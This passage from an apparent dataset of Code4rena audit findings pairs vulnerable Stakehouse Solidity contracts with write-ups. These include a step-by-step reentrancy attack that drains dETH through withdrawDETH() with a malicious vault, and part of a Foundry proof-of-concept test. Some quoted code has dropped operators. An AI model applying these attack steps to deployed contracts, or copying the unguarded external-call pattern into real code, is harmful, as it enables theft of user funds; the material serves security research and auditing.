memory sigs) = getFakeEIP712Signature();\n        vm.expectRevert(\"BLS public key is banned or not a part of LSD network\");\n        manager.mintDerivatives(\n            getBytesArrayFromBytes(blsPubKeyOne),\n            reports,\n            sigs\n        );\n\n        // Validate depositor cannot burn LP tokens\n        vm.startPrank(savETHUser);\n        vm.expectRevert(\"Cannot burn LP tokens\");\n        savETHVault.burnLPTokensByBLS(getBytesArrayFromBytes(blsPubKeyOne), getUint256ArrayFromValues(24 ether));\n        vm.stopPrank();\n    }\n\n\n\nTo run the POC execute:  yarn test -m testLockStakersFunds -v  \n\nExpected output:\n\n    Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\n    PASS] testLockStakersFunds() (gas: 1731537)\n    Test result: ok. 1 passed; 0 failed; finished in 8.21ms\n\nTo see the full trace, execute: yarn test -m testLockStakersFunds -vvvv\n\n\nVS Code, Foundry\n\n",
                "Repair": "\n1.  Add a reentrancy guard to withdrawETHForKnot and stake\n2.  Keep proper accounting for ETH deposited by node runner for each BLS key\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface IBrandNFT {\n    function toLowerCase(string memory _base) external pure returns (string memory);\n    function lowercaseBrandTickerToTokenId(string memory _ticker) external returns (uint256);\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { SavETHVault } from \"./SavETHVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\n\n/// @notice A giant pool that can provide protected deposit liquidity to any liquid staking network\ncontract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {\n\n    /// @notice Emitted when giant LP is burnt to receive dETH\n    event LPBurnedForDETH(address indexed savETHVaultLPToken, address indexed sender, uint256 amount);\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(0), \"GiantETHLP\", \"gETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Given the liquidity of the giant pool, stake ETH to receive protected deposits from many liquid staking networks (LSDNs)\n    /// @dev Take ETH from the contract balance in order to send money to the individual vaults\n    /// @param _savETHVaults List of savETH vaults that belong to individual liquid staking derivative networks\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding\n    function batchDepositETHForStaking(\n        address[] calldata _savETHVaults,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeys,\n        uint256[][] calldata _stakeAmounts\n    ) public {\n        uint256 numOfSavETHVaults = _savETHVaults.length;\n        require(numOfSavETHVaults > 0, \"Empty arrays\");\n        require(numOfSavETHVaults == _ETHTransactionAmounts.length, \"Inconsistent array lengths\");\n        require(numOfSavETHVaults == _blsPublicKeys.length, \"Inconsistent array lengths\");\n        require(numOfSavETHVaults == _stakeAmounts.length, \"Inconsistent array lengths\");\n\n        // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator\n        for (uint256 i; i < numOfSavETHVaults; ++i) {\n            uint256 transactionAmount = _ETHTransactionAmounts[i];\n\n            // As ETH is being deployed to a savETH pool vault, it is no longer idle\n            idleETH -= transactionAmount;\n\n            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            // Deposit ETH for staking of BLS key\n            savETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n                _blsPublicKeys[i],\n                _stakeAmounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults\n    /// @param _savETHVaults List of savETH vaults being interacted with\n    /// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH\n    /// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETH\n    function withdrawDETH(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _savETHVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n\n        // Firstly capture current dETH balance and see how much has been deposited after the loop\n        uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));\n        for (uint256 i; i < numOfVaults; ++i) {\n            SavETHVault vault = SavETHVault(_savETHVaults[i]);\n\n            // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user\n            for (uint256 j; j < _lpTokens[i].length; ++j) {\n                LPToken token = _lpTokens[i][j];\n                uint256 amount = _amounts[i][j];\n\n                // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP\n                _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n                require(vault.isDETHReadyForWithdrawal(address(token)), \"dETH is not ready for withdrawal\");\n\n                // Giant LP is burned 1:1 with LPs from sub-networks\n                require(lpTokenETH.balanceOf(msg.sender) >= amount, \"User does not own enough LP\");\n\n                // Burn giant LP from user before sending them dETH\n                lpTokenETH.burn(msg.sender, amount);\n\n                emit LPBurnedForDETH(address(token), msg.sender, amount);\n            }\n\n            // Ask\n            vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n        }\n\n        // Calculate how much dETH has been received from burning\n        dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;\n\n        // Send giant LP holder dETH owed\n        getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _savETHVaults List of savETH vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _savETHVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            SavETHVault(_savETHVaults[i]).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a savETH vault can be brought back into the giant pool\n    /// @param _savETHVaults List of savETH vaults where ETH is staked\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a savETH vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _savETHVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            SavETHVault vault = SavETHVault(_savETHVaults[i]);\n            for (uint256 j; j < _lpTokens[i].length; ++j) {\n                require(\n                    vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,\n                    \"ETH is either staked or derivatives minted\"\n                );\n            }\n\n            vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n        }\n    }\n}\n\n",
        "CodeNames": [
            "IBrandNFT.sol",
            "GiantSavETHVaultPool.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-13",
                "Location": [
                    "dETHReceivedFromAllSavETHVaults",
                    "getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);",
                    "withdrawDETH()",
                    "uint"
                ],
                "Type": " Possible reentrancy and fund theft in  withdrawDETH()  of  GiantSavETHVaultPool  because there is no whitelist check for user provided Vaults and there is no reentrancy defense",
                "Description": "*Submitted by unforgiven(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/226)*\n\nFunction withdrawDETH() in GiantSavETHVaultPool allows a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults. This function make external calls to user provided addresses without checking those addresses and send increased dETH balance of contract during the call to user. User can provide malicious addresses to contract and then took the execution flow during the transaction and increase dETH balance of contract by other calls and make contract to transfer them to him.\n\n\nThis is withdrawDETH() in GiantSavETHVaultPool  code:\n\n        /// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults\n        /// @param _savETHVaults List of savETH vaults being interacted with\n        /// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH\n        /// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETH\n        function withdrawDETH(\n            address[] calldata _savETHVaults,\n            LPToken[][] calldata _lpTokens,\n            uint256[][] calldata _amounts\n        ) external {\n            uint256 numOfVaults = _savETHVaults.length;\n            require(numOfVaults  0, \"Empty arrays\");\n            require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n            require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n\n            // Firstly capture current dETH balance and see how much has been deposited after the loop\n            uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));\n            for (uint256 i; i < numOfVaults; ++i) {\n                SavETHVault vault = SavETHVault(_savETHVaults[i]);\n\n                // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user\n                for (uint256 j; j < _lpTokens[i].length; ++j) {\n                    LPToken token = _lpTokens[i][j];\n                    uint256 amount = _amounts[i][j];\n\n                    // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP\n                    _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n                    require(vault.isDETHReadyForWithdrawal(address(token)), \"dETH is not ready for withdrawal\");\n\n                    // Giant LP is burned 1:1 with LPs from sub-networks\n                    require(lpTokenETH.balanceOf(msg.sender) = amount, \"User does not own enough LP\");\n\n                    // Burn giant LP from user before sending them dETH\n                    lpTokenETH.burn(msg.sender, amount);\n\n                    emit LPBurnedForDETH(address(token), msg.sender, amount);\n                }\n\n                // Ask\n                vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n            }\n\n            // Calculate how much dETH has been received from burning\n            dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) dETHReceivedFromAllSavETHVaults;\n\n            // Send giant LP holder dETH owed\n            getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);\n        }\n\nAs you can see first contract save the dETH balance of contract by this line: uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)); and then it loops through user provided vaults addresses and call those vaults to withdraw dETH and in the end it calculates dETHReceivedFromAllSavETHVaults and transfer those dETH to user:   getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults); . attacker can perform these steps:\n1. create a malicious contract AttackerVault which is copy of SavETHVault with modifiction.\n2. call withdrawDETH() with Vault list [ValidVault1, ValidVault2, AttackerVault, ValidVaul3].\n3. contract would save the dETH balance of itself and then loops through Vaults to validate and burn LPTokens.\n4. contract would reach Vault AttackerVault and call attacker controlled address.\n5. attacker contract call other functions to increase dETH balance of contract (if it's not possible to increase dETH balance of contract by other way so there is no need to save contract initial balance of dETH before the loop and dETH balance of contract would be zero always)\n6. withdrawDETH() would finish the loop and transfer all the increase dETH balance to attacker which includes extra amounts.\n\nBecause contract don't check the provided addresses and calls them and there is no reentrancy defense mechanism there is possibility of reentrancy attack which can cause fund lose.\n\n\nVIM\n\n",
                "Repair": "\nCheck the provided addresses and also have some reentrancy defense mechanisim.\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/226)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.13;\n\n// SPDX-License-Identifier: MIT\n\ninterface ILiquidStakingManager {\n\n    function stakehouse() external view returns (address);\n\n    /// @param _dao address of the DAO\n    /// @param _syndicateFactory address of the syndicate factory\n    /// @param _smartWalletFactory address of the smart wallet factory\n    /// @param _lpTokenFactory LP token factory address required for deployment of savETH vault\n    /// @param _stakehouseTicker 3-5 character long name for the stakehouse to be deployed\n    function init(\n        address _dao,\n        address _syndicateFactory,\n        address _smartWalletFactory,\n        address _lpTokenFactory,\n        address _brand,\n        address _savETHVaultDeployer,\n        address _stakingFundsVaultDeployer,\n        address _optionalGatekeeperDeployer,\n        uint256 _optionalCommission,\n        bool _deployOptionalGatekeeper,\n        string calldata _stakehouseTicker\n    ) external;\n\n    /// @notice function to check valid BLS public key for LSD network\n    /// @param _blsPublicKeyOfKnot BLS public key to check validity for\n    /// @return true if BLS public key is a part of LSD network, false otherwise\n    function isBLSPublicKeyPartOfLSDNetwork(bytes calldata _blsPublicKeyOfKnot) external view returns (bool);\n\n    /// @notice function to check if BLS public key registered with the network or has been withdrawn before staking\n    /// @param _blsPublicKeyOfKnot BLS public key to check validity for\n    /// @return true if BLS public key is banned, false otherwise\n    function isBLSPublicKeyBanned(bytes calldata _blsPublicKeyOfKnot) external view returns (bool);\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { SavETHVault } from \"./SavETHVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\n\n/// @notice A giant pool that can provide protected deposit liquidity to any liquid staking network\ncontract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {\n\n    /// @notice Emitted when giant LP is burnt to receive dETH\n    event LPBurnedForDETH(address indexed savETHVaultLPToken, address indexed sender, uint256 amount);\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(0), \"GiantETHLP\", \"gETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Given the liquidity of the giant pool, stake ETH to receive protected deposits from many liquid staking networks (LSDNs)\n    /// @dev Take ETH from the contract balance in order to send money to the individual vaults\n    /// @param _savETHVaults List of savETH vaults that belong to individual liquid staking derivative networks\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding\n    function batchDepositETHForStaking(\n        address[] calldata _savETHVaults,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeys,\n        uint256[][] calldata _stakeAmounts\n    ) public {\n        uint256 numOfSavETHVaults = _savETHVaults.length;\n        require(numOfSavETHVaults > 0, \"Empty arrays\");\n        require(numOfSavETHVaults == _ETHTransactionAmounts.length, \"Inconsistent array lengths\");\n        require(numOfSavETHVaults == _blsPublicKeys.length, \"Inconsistent array lengths\");\n        require(numOfSavETHVaults == _stakeAmounts.length, \"Inconsistent array lengths\");\n\n        // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator\n        for (uint256 i; i < numOfSavETHVaults; ++i) {\n            uint256 transactionAmount = _ETHTransactionAmounts[i];\n\n            // As ETH is being deployed to a savETH pool vault, it is no longer idle\n            idleETH -= transactionAmount;\n\n            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            // Deposit ETH for staking of BLS key\n            savETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n                _blsPublicKeys[i],\n                _stakeAmounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults\n    /// @param _savETHVaults List of savETH vaults being interacted with\n    /// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH\n    /// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETH\n    function withdrawDETH(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _savETHVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n\n        // Firstly capture current dETH balance and see how much has been deposited after the loop\n        uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));\n        for (uint256 i; i < numOfVaults; ++i) {\n            SavETHVault vault = SavETHVault(_savETHVaults[i]);\n\n            // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user\n            for (uint256 j; j < _lpTokens[i].length; ++j) {\n                LPToken token = _lpTokens[i][j];\n                uint256 amount = _amounts[i][j];\n\n                // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP\n                _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n                require(vault.isDETHReadyForWithdrawal(address(token)), \"dETH is not ready for withdrawal\");\n\n                // Giant LP is burned 1:1 with LPs from sub-networks\n                require(lpTokenETH.balanceOf(msg.sender) >= amount, \"User does not own enough LP\");\n\n                // Burn giant LP from user before sending them dETH\n                lpTokenETH.burn(msg.sender, amount);\n\n                emit LPBurnedForDETH(address(token), msg.sender, amount);\n            }\n\n            // Ask\n            vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n        }\n\n        // Calculate how much dETH has been received from burning\n        dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;\n\n        // Send giant LP holder dETH owed\n        getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _savETHVaults List of savETH vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _savETHVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            SavETHVault(_savETHVaults[i]).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a savETH vault can be brought back into the giant pool\n    /// @param _savETHVaults List of savETH vaults where ETH is staked\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a savETH vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _savETHVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            SavETHVault vault = SavETHVault(_savETHVaults[i]);\n            for (uint256 j; j < _lpTokens[i].length; ++j) {\n                require(\n                    vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,\n                    \"ETH is either staked or derivatives minted\"\n                );\n            }\n\n            vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n        }\n    }\n}\n\n",
        "CodeNames": [
            "ILiquidStakingManager.sol",
            "GiantMevAndFeesPool.sol",
            "GiantSavETHVaultPool.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-14",
                "Location": [
                    "bringUnusedETHBackIntoGiantPool()",
                    "burnLPTokens()",
                    "ETH",
                    "batchDepositETHForStaking()",
                    "idleETH",
                    "GiantSavETHVaultPool()",
                    "stakehouse"
                ],
                "Type": " Fund lose in function  bringUnusedETHBackIntoGiantPool()  of  GiantSavETHVaultPool  ETH gets back to giant pool but the value of idleETH don't increase",
